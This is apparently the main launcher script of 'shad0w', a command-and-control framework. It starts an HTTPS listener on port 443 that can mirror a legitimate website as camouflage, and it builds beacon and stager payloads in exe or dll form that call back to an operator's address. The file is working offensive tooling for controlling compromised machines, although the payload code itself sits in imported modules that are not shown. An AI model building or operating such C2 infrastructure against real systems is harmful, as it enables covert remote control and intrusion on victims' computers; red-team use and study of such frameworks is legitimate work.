#!/usr/bin/env python3

import os
import sys
import ssl
import socket
import asyncio
import argparse

from threading import Thread

from lib import debug
from lib import banner
from lib import http_server
from lib import console
from lib import encryption
from lib import buildtools
from lib import mirror
from lib import payload_format
from lib import tools

class Shad0wC2(object):

    def __init__(self, args):

        super(Shad0wC2, self).__init__()

        # payload store
        self.payloads                = {}

        # declare all the vitial variables to run.
        self.addr                    = (args['address'], args['port'])
        self.debugv                  = args['debug']
        self.sslkey                  = args['key']
        self.sslcrt                  = args['cert']

        # framework variables
        self.variables               = {}

        # set the msf callback size
        self.variables["MsfUriSize"] = 1337

        # website we can mirror
        self.mirror                  = args['mirror']

        # endpoint for modules to callback to
        self.endpoint                = args['endpoint']

        # runtime variables
        self.beacons                 = {}
        self.beacon_count            = 0
        self.current_beacon          = None

        # loading screen stuff
        self.screen_finish  = False

        # get the debug/logging stuff ready
        self.debug                   = debug.Debug(self.debugv)

        # console class
        self.console                 = console.Console(self)

        # super useful
        self.crypt                   = encryption

    def start(self):

        # mirror a website if we need to
        if self.mirror is not None:
            mirror.mirror_site(self, self.mirror)

        # compile the payloads, this makes execution of modules quicker
        self.compile_finished = False

        # start the loading banner
        Thread(target=tools.loading_banner, args=(self,)).start()

        # start to do the compiling
        asyncio.run(tools.compile_and_store_static(self))
        asyncio.run(tools.compile_and_store_static_srdi(self))

        # make sure we are in the rootdir
        os.chdir("/root/shad0w")

        # make sure the loading screen has finished
        while self.screen_finish != True:
            pass

        # show the banner
        banner.Banner()

        # start the http server thread
        # self.debug.log("starting http server thread")
        thttp = Thread(target=http_server.run_serv, args=(self,))
        thttp.daemon = True
        thttp.start()
        # asyncio.run(http_server.run_serv(self))

        # start the console
        asyncio.run(self.console.start())
        # tconsole = Thread(target=self.console.start)
        # tconsole.daemon = False
        # tconsole.start()


class Shad0wBuilder(object):

    def __init__(self, args):

        super(Shad0wBuilder, self).__init__()

        # key variables for the build
        self.address   = args['address']
        self.port      = args['port']
        self.jitter    = args['jitter']
        self.format    = args['format']
        self.outfile   = args['out']
        self.debugv    = args['debug']
        self.payload   = args['payload']
        self.no_shrink = args['no_shrink']

        # get the debug/logging stuff ready
        self.debug   = debug.Debug(self.debugv)

    def build(self):

        # get the variables for the make
        self.arch, self.platform, self.secure, self.static = buildtools.get_payload_variables(self.payload)

        # copy the correct source files into build directory
        if self.static is not None:
            # then we are building a static beacon

            # what type we need?
            if self.format == "exe":
                buildtools.clone_source_files(asm=True)
            else:
                buildtools.clone_source_files(asm=True, rootdir="injectable")

        if self.static is None:
            # then we are building a stager
            buildtools.clone_source_files(asm=True, rootdir="stager")

        # change the settings file based on the args we been given
        buildtools.update_settings_file(self)

        # now we need to run 'make' inside the cloned dir
        if self.format == "dll":
            buildtools.make_in_clone(arch=self.arch, platform=self.platform, secure=self.secure, static=self.static, debug=self.debugv, modlocation="/root/shad0w/beacon/beacon.dll")
        else:
            buildtools.make_in_clone(arch=self.arch, platform=self.platform, secure=self.secure, static=self.static, debug=self.debugv)

        length = payload_format.create(self)

        if length != False:
            print("\033[1;32m[+]\033[0m", f"Created {self.outfile} ({length} bytes)")




if __name__ == '__main__':

    # sort the first cmd switch to decide weather we beacon or listen
    parser = argparse.ArgumentParser(prog='shad0w')
    subparsers = parser.add_subparsers(dest='mode', help='shad0w C2 functions')
    listen_parser = subparsers.add_parser('listen', help="Tell shad0w to listen for connections")
    beacon_parser = subparsers.add_parser('beacon', help="Tell shad0w to create a beacon")
    update_parser = subparsers.add_parser('update', help="Update shad0w")

    listen_parser.add_argument("-a", "--address", required=False, default="0.0.0.0", help="Address shad0w will listen on (default will be 0.0.0.0)")
    listen_parser.add_argument("-p", "--port", required=False, default=443, help="Port the C2 will bind to (default is 443)")
    listen_parser.add_argument("-k", "--key", required=False, default="certs/key.pem", help="Private key for the HTTPS server")
    listen_parser.add_argument("-c", "--cert", required=False, default="certs/cert.pem", help="Certificate for the HTTPS server")
    listen_parser.add_argument("-m", "--mirror", required=False, default=None, help="Website to mirror for if a client connects to the C2 via a web browser")
    listen_parser.add_argument("-d", "--debug", required=False, action='store_true', help="Start debug mode")
    listen_parser.add_argument("-e", "--endpoint", required=False, default=None, help="The endpoint shad0w modules will callback to")

    beacon_parser.add_argument("-p", "--payload", required=True, help="Beacon payload to use")
    beacon_parser.add_argument("-H", "--address", required=True, help="Address the beacon will connect to")
    beacon_parser.add_argument("-P", "--port", required=False, default=443, help="Port the beacon will connect on")
    beacon_parser.add_argument("-j", "--jitter", required=False, default=1, type=int, help="Jitter the beacon should use when connecting back")
    beacon_parser.add_argument("-f", "--format", required=True, choices=payload_format.formats, help="Format to store the beacon payload as")
    beacon_parser.add_argument("-o", "--out", required=True, help="File to store the beacon in")
    beacon_parser.add_argument("-n", "--no-shrink", required=False, action='store_true', help="Leave the file at its final size, do not attempt to shrink it")
    beacon_parser.add_argument("-d", "--debug", required=False, action='store_true', help="Start debug mode")

    # parse the args
    args = vars(parser.parse_args())

    # first check if we need to update
    if args["mode"] == "update":
        print("Updating...")
        os.system("git pull")

    # set the arguments for the listen
    if args["mode"] == "listen":
        shad0w = Shad0wC2(args)
        asyncio.run(shad0w.start())

    # set the arguments for creating the beacon
    if args["mode"] == "beacon":
        # build the beacon
        shad0w = Shad0wBuilder(args)
        shad0w.build()